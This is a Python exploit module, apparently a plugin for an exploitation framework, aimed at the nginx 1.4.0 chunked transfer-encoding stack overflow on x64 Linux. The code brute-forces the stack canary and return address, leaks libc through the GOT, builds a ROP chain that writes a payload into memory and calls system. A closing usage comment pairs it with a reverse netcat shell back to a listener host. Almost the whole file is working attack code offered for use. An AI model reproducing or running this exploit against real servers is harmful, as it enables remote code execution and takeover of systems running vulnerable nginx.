
# ---------------------------------------------------------------------------------------------------- #
# Exploit for nginx 1.4.0 buffer overflow x64                                                          #
# compiled on Ubuntu 18.04 with Canary and DEP/NX + ASLR and PIE                                       #
# Tested on Ubuntu 18.04 + libc.so.6 2.2.5                                                             #
# The exploit work in 4 stages:                                                                        #
# 1) Brute-forcing canary with byte by byte overwriting                                                #
# 2) Brute-forcing a valid return address of nginx using byte by byte overwriting                      #
# 3) Deducing the nginx address space base by leaking the address of execve@libc from GOT              #
# 4) Write the payload in memory (with memset) and call system@libc                                    #
#                                                                                                      #
# Used techniques: Canary bruteforcing, ASLR bruteforcing, information leakage,                        #
#                  ROP, ret2plt and ret2libc                                                           #
# Note: Since there are multiple valid return address this exploit try them all to find base address   #
#       The exploit may be too big sometimes for the available memory in stack and fail                #
# ---------------------------------------------------------------------------------------------------- #

# --------------------------------------- Loading packages... ---------------------------------------- #
import typing
import socket
import struct
import pathlib

from pytoolcore import style, exception
from core import exploitcore
from pwncore import rop, process, pwnutils


# ---------------------------------------------------------------------------------------------------- #


# -------------------------------- Nginx 1.4.0 child process stub ------------------------------------ #

class Nginx140x64(process.RemoteProcess):
    REQ: bytes = b"GET / HTTP/1.1\r\n" + \
                 b"Host: pwner.com\r\n" + \
                 b"Connection: Keep-Alive\r\n" + \
                 b"\r\n"
    EVILREQ: bytes = b"GET / HTTP/1.1\r\n" + \
                     b"Host: pwner.com\r\n" + \
                     b"Transfer-Encoding: Chunked\r\n" + \
                     b"Connection: Keep-Alive\r\n" + \
                     b"\r\n" + \
                     b"deadbeefdeadbeeff\r\n"

    def __init__(self, rsockaddr: typing.Tuple[typing.Any, ...]) -> None:
        super(Nginx140x64, self).__init__(rsockaddr, pwnutils.X64(), 0.02)

    def connect(self) -> None:
        super(Nginx140x64, self).connect()
        try:
            self.send(Nginx140x64.REQ)
            res = self.recv(65535)
            if b"200 OK" in res or b"404" in res or b"302" in res:
                self.clear()
            else:
                super(Nginx140x64, self).disconnect()
                raise (exception.FailureException("Http server not available"))
        except(socket.error, socket.herror, socket.gaierror, socket.timeout) as err:
            super(Nginx140x64, self).disconnect()
            raise (exception.ErrorException(str(err)))

    def ready(self) -> None:
        try:
            self.send(Nginx140x64.EVILREQ)
            self.clear()
        except(socket.error, socket.herror, socket.gaierror, socket.timeout) as err:
            super(Nginx140x64, self).disconnect()
            raise (exception.ErrorException(str(err)))

    def alive(self) -> bool:
        return super(Nginx140x64, self).alive()


# ---------------------------------------------------------------------------------------------------- #


class Linux64NginxChunkedExploit(exploitcore.Exploit):
    AUTHOR: str = "Danakane"
    EXPLOITREF: str = "linux_x64_nginx_chunked"
    PAYLOADADDR: int = 0x28f000  # .data
    CANARYOFFSET: int = 4104
    RIPOFFSET: int = 40
    SAVEFILE: str = str(pathlib.Path(__file__).resolve().parent) + "/.save/nginx140chunked.sav"

    RETADDRESSES: typing.List[int] = [
        0x1098d,  # nginx_hash_init+789
        0x3678d,  # nginx_http_get_forwarded_addr+129
        0x3c9af,  # ngx_http_arg+95
        0x3df8d  # ngx_http_write_filter+1424
    ]

    PLT: typing.Dict[str, int] = {
        "write@plt": 0xd000,  # used read memory
        "memset@plt": 0xd170,  # used to write memory
        "execve@plt": 0xd250,  # address used to calculate libc base address
        "strcmp@plt": 0xd280  # use control indirectly rdx instead of pop rdx ret
    }

    GOT: typing.Dict[str, int] = {
        "execve@got": 0x28ed60
    }

    LIBC: typing.Dict[str, int] = {
        "execve@libc": 0xe4e30,
        "system@libc": 0x4f440
    }

    GADGETS: typing.Dict[str, typing.List[int]] = {
        "pop_rdi_ret": [0xe119, "pop rdi; ret;", 1],
        "pop_rsi_ret": [0x11ba8, "pop rsi; ret;", 1],
        "ret": [0xe11a, "ret;", 0]  # for 16-bytes alignment upon calling system@libc
    }

    def __init__(self):
        compatibleploads: typing.List[str] = ["reverse/linux_netcat"]
        super(Linux64NginxChunkedExploit, self).__init__(
            author=Linux64NginxChunkedExploit.AUTHOR,
            ref=Linux64NginxChunkedExploit.EXPLOITREF,
            compatibleploads=compatibleploads)
        self.__nginx__: Nginx140x64 = None
        self.__canary__: int = 0x0
        self.__nginxaddr__: int = 0x0
        self.__nginxbase__: int = 0x0
        self.__libcbase__: int = 0x0
        self.__rop__: rop.ROP = rop.ROP()

        self.__canaryfound__: bool = False
        self.__nginxaddrfound__: bool = False
        self.__nginxbasefound__: bool = False
        self.__libcbasefound__: bool = False

    def readqword(self, stuff) -> int:
        qword: bytes = b""
        while not len(qword) == 8:
            for byte in [struct.pack("B", x) for x in range(256)]:
                print("0x" + b"\x00".hex() * (8 - len(qword) - 1) + style.Style.red(byte.hex()) +
                      style.Style.green(qword[::-1].hex()), end="\r")
                self.__nginx__.connect()
                self.__nginx__.ready()
                self.__nginx__.send(stuff + qword + byte)
                stillalive: bool = self.__nginx__.alive()
                self.__nginx__.disconnect()
                if stillalive:
                    qword += byte
                    break
                elif byte == b"\xff":
                    raise exception.FailureException("Failed to bruteforce process memory :(")
        print(Linux64NginxChunkedExploit.qword2str(qword[::-1]))
        return struct.unpack("<Q", qword)[0]

    def bruteforcecanary(self) -> None:
        self.__canaryfound__ = False
        self.__canary__ = self.readqword(b"A" * Linux64NginxChunkedExploit.CANARYOFFSET)
        self.__canaryfound__ = True

    def readstack(self, depth: int = 6) -> typing.List[int]:
        qwords: typing.List[int] = []
        if not self.__canary__:
            self.bruteforcecanary()
        for i in range(depth):
            qwords.append(self.readqword(b"A" * Linux64NginxChunkedExploit.CANARYOFFSET +
                                         struct.pack("<Q", self.__canary__) +
                                         b"".join([struct.pack("<Q", qword) for qword in qwords])))
        return qwords

    def bruteforcenginxaddr(self) -> None:
        print(style.Style.info("Start bruteforcing stack..."))
        qwords: typing.List[int] = self.readstack(depth=6)
        self.__nginxaddrfound__ = False
        self.__nginxaddr__ = qwords[len(qwords) - 1]
        self.__nginxaddrfound__ = True

    def leaklibc(self) -> None:
        for offset in Linux64NginxChunkedExploit.RETADDRESSES:
            base: int = self.__nginxaddr__ - offset
            print(style.Style.info("Trying to leak libc base address using nginx base address " +
                                   Linux64NginxChunkedExploit.int2str(base)))
            if self.tryleak(base):
                self.__nginxbase__ = base
                self.__nginxbasefound__ = True
                print(style.Style.success(
                    "execve@libc found: " +
                    Linux64NginxChunkedExploit.int2str(self.__libcbase__ +
                                                       Linux64NginxChunkedExploit.LIBC["execve@libc"])))
                break
            else:
                print(style.Style.failure(Linux64NginxChunkedExploit.int2str(base) +
                                          " isn't nginx base address"))
        if not self.__libcbasefound__:
            raise exception.FailureException("Failed to find nginx base address :(")

    def tryleak(self, base: int, fromfd: int = 20) -> bool:  # find nginx base and libc base at the same time
        success: bool = False
        res: bytes = b""
        trash: bytes = b"A" * Linux64NginxChunkedExploit.CANARYOFFSET
        junk: bytes = b"A" * Linux64NginxChunkedExploit.RIPOFFSET
        for fd in range(fromfd, 3, -1):
            self.__rop__.clear()
            self.initgadgets(base)
            self.ropmemread(fd, Linux64NginxChunkedExploit.GOT["execve@got"], base, 2)
            self.__nginx__.connect()
            self.__nginx__.ready()
            self.__nginx__.clear(0.02)
            self.__nginx__.send(trash + struct.pack("<Q", self.__canary__) + junk + self.__rop__.raw)
            try:
                while len(res) < 8:
                    res += self.__nginx__.recv(size=8, timeout=5)
                    if not res:  # empty -> connection is dead
                        break
            except (socket.timeout, socket.error):
                pass
            finally:
                self.__nginx__.disconnect()
        if len(res) >= 8:
            self.__libcbase__ = struct.unpack("<Q", res[:8])[0] - Linux64NginxChunkedExploit.LIBC["execve@libc"]
            self.__libcbasefound__ = True
            success = True
        return success

    def initgadgets(self, base: int) -> None:
        self.__rop__.clear(base)
        for gadgetname, [addr, comment, nbparameters] in Linux64NginxChunkedExploit.GADGETS.items():
            self.__rop__.register(gadgetname=gadgetname, gadgetaddr=addr,
                                  nbparameters=nbparameters, gadgetcomments=comment)

    def ropmemread(self, fd: int, addr: int, base: int, times: int = 1):  # read x times 5 bytes starting from addr
        # fd is the remote nginx socket file descriptor
        for i in range(times):
            # set rdx at 0x5 -> number of bytes that write@plt will read from memory
            self.__rop__.packgadget("pop_rdi_ret", base + Linux64NginxChunkedExploit.PLT["execve@plt"])
            self.__rop__.packgadget("pop_rsi_ret", base + Linux64NginxChunkedExploit.PLT["execve@plt"])
            self.__rop__.pack(base + Linux64NginxChunkedExploit.PLT["strcmp@plt"])
            # set rdi with fd
            self.__rop__.packgadget("pop_rdi_ret", fd)
            # set rsi with addr
            self.__rop__.packgadget("pop_rsi_ret", base + addr + 0x5 * i)
            self.__rop__.pack(base + Linux64NginxChunkedExploit.PLT["write@plt"])

    def ropmemwrite(self, stuff: bytes, addr: int, base: int) -> None:  # write stuff + 5 0x00 at addr
        offset: int = 0x0
        for byte in (stuff + b"\x00"):
            # set rdx at 0x5 -> number of bytes that memset@plt will write
            self.__rop__.packgadget("pop_rdi_ret", base + Linux64NginxChunkedExploit.PLT["execve@plt"])
            self.__rop__.packgadget("pop_rsi_ret", base + Linux64NginxChunkedExploit.PLT["execve@plt"])
            self.__rop__.pack(base + Linux64NginxChunkedExploit.PLT["strcmp@plt"])
            # set rdi with the writable memory addr: .data for example
            self.__rop__.packgadget("pop_rdi_ret", base + addr + offset)
            # set rsi with the byte to write
            self.__rop__.packgadget("pop_rsi_ret", byte)
            self.__rop__.pack(base + Linux64NginxChunkedExploit.PLT["memset@plt"])
            offset += 0x1

    def pwn(self) -> None:
        self.__rop__.clear()
        self.initgadgets(self.__nginxbase__)
        trash: bytes = b"A" * Linux64NginxChunkedExploit.CANARYOFFSET
        junk: bytes = b"A" * Linux64NginxChunkedExploit.RIPOFFSET
        print(style.Style.success("Deduced system@libc address: " +
                                  Linux64NginxChunkedExploit.int2str(self.__libcbase__ +
                                                                     Linux64NginxChunkedExploit.LIBC["system@libc"])))
        self.ropmemwrite(self.payloadbin, Linux64NginxChunkedExploit.PAYLOADADDR, self.__nginxbase__)
        self.__rop__.packgadget("pop_rdi_ret", self.__nginxbase__ + Linux64NginxChunkedExploit.PAYLOADADDR)
        self.__rop__.packgadget("ret")  # fix rsp 16 bytes alignment to prevent system@libc to crash
        self.__rop__.pack(self.__libcbase__ + Linux64NginxChunkedExploit.LIBC["system@libc"])
        exploitbin: bytes = trash + struct.pack("<Q", self.__canary__) + junk + self.__rop__.raw
        self.__nginx__.connect()
        self.__nginx__.ready()
        self.__nginx__.send(exploitbin)
        self.__nginx__.disconnect()

    def save(self):
        file = open(Linux64NginxChunkedExploit.SAVEFILE, "w", 1)
        if self.__canaryfound__:
            file.write("canary=" + str(self.__canary__) + "\n")
        if self.__nginxaddrfound__:
            file.write("nginxaddr=" + str(self.__nginxaddr__) + "\n")
        if self.__libcbasefound__:
            file.write("nginxbase=" + str(self.__nginxbase__) + "\n")
            file.write("libcbase=" + str(self.__libcbase__) + "\n")
        file.close()

    def load(self):
        file = open(Linux64NginxChunkedExploit.SAVEFILE, "r", 1)
        linebuf: str = file.readline()
        while linebuf:
            if linebuf != "\n":
                field: str = linebuf.split("=")[0]
                value: int = int(linebuf.split("=")[1][:-1])  # "remove \n at the end"
                if field == "canary":
                    self.__canaryfound__ = True
                    self.__canary__ = value
                elif field == "nginxaddr":
                    self.__nginxaddrfound__ = True
                    self.__nginxaddr__ = value
                elif field == "libcbase":
                    self.__libcbasefound__ = True
                    self.__libcbase__ = value
                elif field == "nginxbase":
                    self.__nginxbasefound__ = True
                    self.__nginxbase__ = value
            linebuf = file.readline()

    def run(self, rsockaddr: typing.Tuple[typing.Any, ...]) -> None:
        self.__nginx__ = Nginx140x64(rsockaddr)

        self.load()

        """Phase 1: Bruteforcing the canary"""
        print()
        print(style.Style.info("Phase 1 - Canary bruteforcing"))
        if not self.__canaryfound__:
            self.bruteforcecanary()
            print(style.Style.success("Canary found: " +
                                      Linux64NginxChunkedExploit.int2str(self.__canary__)))
            self.save()
        else:
            print(style.Style.info("Canary loaded from saved state: " + self.int2str(self.__canary__)))

        """Phase 2: Bruteforcing nginx valid return address"""
        print()
        print(style.Style.info("Phase 2 - Nginx address bruteforcing"))
        if not self.__nginxaddrfound__:
            self.bruteforcenginxaddr()
            self.save()
            print(style.Style.success("Found a valid code section address to return: " +
                                      Linux64NginxChunkedExploit.int2str(self.__nginxaddr__)))
        else:
            print(style.Style.info("Nginx valid code section address loaded from saved state: " +
                                   self.int2str(self.__nginxaddr__)))

        """Phase 3: Leaking libc address"""
        print()
        print(style.Style.info("Phase 3 - Leaking execve@libc address"))
        if not (self.__libcbasefound__ and self.__nginxbasefound__):
            self.leaklibc()
            self.save()
            print(style.Style.success("Deduced libc base address address: " +
                                      Linux64NginxChunkedExploit.int2str(self.__libcbase__)))
        else:
            print(style.Style.info("Nginx base address loaded from saved state: " +
                                   self.int2str(self.__nginxbase__)))
            print(style.Style.info("Libc base address loaded from saved state: " +
                                   self.int2str(self.__libcbase__)))

        """Phase 4: Actual pwning by ret2libc"""
        print()
        print(style.Style.info("Phase 4 - Pwning with the final exploit"))
        self.pwn()
        print(style.Style.success("Exploit deployed."))

    @staticmethod
    def qword2str(qword: bytes) -> str:
        return "0x" + qword.hex()

    @staticmethod
    def int2str(qword: int) -> str:
        return "0x" + struct.pack(">Q", qword).hex()


blueprint: typing.Callable = Linux64NginxChunkedExploit
name: str = Linux64NginxChunkedExploit.EXPLOITREF

# pwn rhost 192.168.1.52 rport 8081 lhost 192.168.1.84 lport 4444 payload reverse/linux_netcat
